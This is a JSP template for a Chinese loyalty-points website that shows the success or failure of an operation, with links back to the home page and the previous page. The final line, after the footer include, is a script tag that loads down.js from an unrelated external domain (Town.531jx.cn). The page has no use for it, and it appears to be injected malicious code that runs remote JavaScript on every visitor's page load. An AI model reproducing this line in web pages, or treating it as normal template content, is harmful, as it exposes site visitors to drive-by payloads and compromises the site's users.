<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-操作提示"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" height="129" valign="top">
		<%@ include file="searchProductBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	</td>
    <td bgcolor="#FFFFFF" valign="top" width="602" >
      <table width="100%" border="0" >
        <tr > 
          <td height="150" colspan="3" align="center"> <c:out value="${result.title}"/>            <c:choose> <c:when test="${result.flag eq 0}"> 
              成功! </c:when> <c:otherwise> 失败! </c:otherwise> 
          </c:choose> </td>
        </tr>
		
				
        <tr> 
          <td width="15%" height="59" align="right"><strong>可能原因:</strong></td>
          <td width="79%" class="red15"><c:if test="${result.msg}"/></td>
          <td width="6%">&nbsp; </td>
        </tr>
		
		
        <tr>
          <td height="41" colspan="2">
		     
            <table width="60%" align="center">
              <tr> 
                <td width="25%" align="right"  class="blue14"><a href='<c:url value="/index.shtml"/>'>返回首页&gt;&gt;</a></td>
                <td width="75%" align="right" class="blue14"><a href="javascript:history.back();" >返回上一页&gt;&gt;</a></td>
              </tr>
          </table></td>
          <td>&nbsp;</td>
        </tr>
      </table>    </td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>